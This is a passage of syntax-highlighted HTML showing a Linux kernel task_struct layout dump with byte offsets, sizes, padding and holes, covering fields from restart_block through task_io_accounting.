</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |     8 */</span>                <span class="k">struct</span> <span class="n">pollfd</span> <span class="o">*</span><span class="n">ufds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2424      |     4 */</span>                <span class="kt">int</span> <span class="n">nfds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2428      |     4 */</span>                <span class="kt">int</span> <span class="n">has_timeout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2432      |     8 */</span>                <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">tv_sec</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2440      |     8 */</span>                <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">tv_nsec</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">poll</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 24-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   56 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">restart_block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2456      |     4 */</span>    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2460      |     4 */</span>    <span class="kt">pid_t</span> <span class="n">tgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2464      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2472      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">real_parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2480      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2488      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2488      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2496      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">children</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2504      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2504      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2512      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sibling</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2520      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">group_leader</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2528      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2528      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2536      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">ptraced</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2544      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2544      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2552      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">ptrace_entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2560      |     8 */</span>    <span class="k">struct</span> <span class="n">pid</span> <span class="o">*</span><span class="n">thread_pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2568      |    64 */</span>    <span class="k">struct</span> <span class="n">hlist_node</span> <span class="n">pid_links</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2632      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2632      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2640      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">thread_group</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2648      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2648      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2656      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">thread_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2664      |     8 */</span>    <span class="k">struct</span> <span class="n">completion</span> <span class="o">*</span><span class="n">vfork_done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2672      |     8 */</span>    <span class="kt">int</span> <span class="o">*</span><span class="n">set_child_tid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2680      |     8 */</span>    <span class="kt">int</span> <span class="o">*</span><span class="n">clear_child_tid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2688      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">worker_private</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2696      |     8 */</span>    <span class="n">u64</span> <span class="n">utime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2704      |     8 */</span>    <span class="n">u64</span> <span class="n">stime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2712      |     8 */</span>    <span class="n">u64</span> <span class="n">gtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2720      |    24 */</span>    <span class="k">struct</span> <span class="n">prev_cputime</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2720      |     8 */</span>        <span class="n">u64</span> <span class="n">utime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2728      |     8 */</span>        <span class="n">u64</span> <span class="n">stime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2736      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">prev_cputime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2744      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nvcsw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2752      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nivcsw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2760      |     8 */</span>    <span class="n">u64</span> <span class="n">start_time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2768      |     8 */</span>    <span class="n">u64</span> <span class="n">start_boottime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2776      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">min_flt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2784      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">maj_flt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2792      |    80 */</span>    <span class="k">struct</span> <span class="n">posix_cputimers</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2792      |    72 */</span>        <span class="k">struct</span> <span class="n">posix_cputimer_base</span> <span class="n">bases</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2864      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">timers_active</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2868      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">expiry_active</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   80 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">posix_cputimers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2872      |    56 */</span>    <span class="k">struct</span> <span class="n">posix_cputimers_work</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2872      |    16 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2872      |     8 */</span>            <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2880      |     8 */</span>            <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2888      |    32 */</span>        <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2888      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2896      |     4 */</span>            <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2900      |     4 */</span>            <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2900      |     4 */</span>                <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2904      |    16 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2904      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2912      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2920      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">scheduled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   56 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">posix_cputimers_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2928      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">ptracer_cred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2936      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2944      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2952      |     8 */</span>    <span class="k">struct</span> <span class="n">key</span> <span class="o">*</span><span class="n">cached_requested_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2960      |    16 */</span>    <span class="kt">char</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2976      |     8 */</span>    <span class="k">struct</span> <span class="n">nameidata</span> <span class="o">*</span><span class="n">nameidata</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2984      |     8 */</span>    <span class="k">struct</span> <span class="n">sysv_sem</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2984      |     8 */</span>        <span class="k">struct</span> <span class="n">sem_undo_list</span> <span class="o">*</span><span class="n">undo_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sysvsem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2992      |    16 */</span>    <span class="k">struct</span> <span class="n">sysv_shm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2992      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2992      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3000      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">shm_clist</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sysvshm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3008      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">last_switch_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3016      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">last_switch_time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3024      |     8 */</span>    <span class="k">struct</span> <span class="n">fs_struct</span> <span class="o">*</span><span class="n">fs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3032      |     8 */</span>    <span class="k">struct</span> <span class="n">files_struct</span> <span class="o">*</span><span class="n">files</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3040      |     8 */</span>    <span class="k">struct</span> <span class="n">io_uring_task</span> <span class="o">*</span><span class="n">io_uring</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3048      |     8 */</span>    <span class="k">struct</span> <span class="n">nsproxy</span> <span class="o">*</span><span class="n">nsproxy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3056      |     8 */</span>    <span class="k">struct</span> <span class="n">signal_struct</span> <span class="o">*</span><span class="n">signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3064      |     8 */</span>    <span class="k">struct</span> <span class="n">sighand_struct</span> <span class="o">*</span><span class="n">sighand</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3072      |     8 */</span>    <span class="kt">sigset_t</span> <span class="n">blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3080      |     8 */</span>    <span class="kt">sigset_t</span> <span class="n">real_blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3088      |     8 */</span>    <span class="kt">sigset_t</span> <span class="n">saved_sigmask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3096      |    24 */</span>    <span class="k">struct</span> <span class="n">sigpending</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3096      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3096      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3104      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3112      |     8 */</span>        <span class="kt">sigset_t</span> <span class="n">signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pending</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3120      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sas_ss_sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3128      |     8 */</span>    <span class="kt">size_t</span> <span class="n">sas_ss_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3136      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sas_ss_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3144      |     8 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">task_works</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3152      |     8 */</span>    <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">audit_context</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3160      |     4 */</span>    <span class="kt">kuid_t</span> <span class="n">loginuid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3164      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sessionid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3168      |    16 */</span>    <span class="k">struct</span> <span class="n">seccomp</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3168      |     4 */</span>        <span class="kt">int</span> <span class="n">mode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3172      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">filter_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3176      |     8 */</span>        <span class="k">struct</span> <span class="n">seccomp_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">seccomp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3184      |    32 */</span>    <span class="k">struct</span> <span class="n">syscall_user_dispatch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3184      |     8 */</span>        <span class="kt">char</span> <span class="o">*</span><span class="n">selector</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3192      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3200      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3208      |     1 */</span>        <span class="kt">bool</span> <span class="n">on_dispatch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  7-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">syscall_dispatch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3216      |     8 */</span>    <span class="n">u64</span> <span class="n">parent_exec_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3224      |     8 */</span>    <span class="n">u64</span> <span class="n">self_exec_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3232      |     4 */</span>    <span class="kt">spinlock_t</span> <span class="n">alloc_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3236      |     4 */</span>    <span class="kt">raw_spinlock_t</span> <span class="n">pi_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3240      |     8 */</span>    <span class="k">struct</span> <span class="n">wake_q_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3240      |     8 */</span>        <span class="k">struct</span> <span class="n">wake_q_node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">wake_q</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3248      |    16 */</span>    <span class="k">struct</span> <span class="n">rb_root_cached</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3248      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_root</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3248      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">rb_root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3256      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_leftmost</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pi_waiters</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3264      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">pi_top_task</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3272      |     8 */</span>    <span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="o">*</span><span class="n">pi_blocked_on</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3280      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">in_ubsan</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3288      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">journal_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3296      |     8 */</span>    <span class="k">struct</span> <span class="n">bio_list</span> <span class="o">*</span><span class="n">bio_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3304      |     8 */</span>    <span class="k">struct</span> <span class="n">blk_plug</span> <span class="o">*</span><span class="n">plug</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3312      |     8 */</span>    <span class="k">struct</span> <span class="n">reclaim_state</span> <span class="o">*</span><span class="n">reclaim_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3320      |     8 */</span>    <span class="k">struct</span> <span class="n">backing_dev_info</span> <span class="o">*</span><span class="n">backing_dev_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3328      |     8 */</span>    <span class="k">struct</span> <span class="n">io_context</span> <span class="o">*</span><span class="n">io_context</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3336      |     8 */</span>    <span class="k">struct</span> <span class="n">capture_control</span> <span class="o">*</span><span class="n">capture_control</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3344      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptrace_message</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3352      |     8 */</span>    <span class="kt">kernel_siginfo_t</span> <span class="o">*</span><span class="n">last_siginfo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3360      |    56 */</span>    <span class="k">struct</span> <span class="n">task_io_accounting</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3360      |     8 */</span>        <span class="n">u64</span> <span class="n">rchar</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3368      |     8 */</span>        <span class="n">u64</span> <span class="n">wchar</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3376      |     8 */</span>        <span class="n">u64</span> <span class="n">syscr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3384      |     8 */</span>        <span class="n">u64</span> <span class="n">syscw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3392      |     8 */</span>        <span class="n">u64</span> <span class="n">read_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3400      |     8 */</span>        <span class="n">u64</span> <span class="n">write_bytes</span><span class="p">;</span>
